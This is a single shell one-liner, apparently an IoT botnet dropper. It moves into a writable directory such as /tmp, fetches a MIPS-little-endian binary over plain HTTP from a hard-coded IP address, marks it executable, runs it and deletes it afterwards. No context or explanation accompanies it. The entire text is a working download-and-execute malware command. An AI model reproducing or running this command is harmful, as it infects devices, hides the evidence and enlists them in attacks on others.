cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.229.222/pl0xmipsel; chmod +x pl0xmipsel; ./pl0xmipsel; rm -rf pl0xmipsel
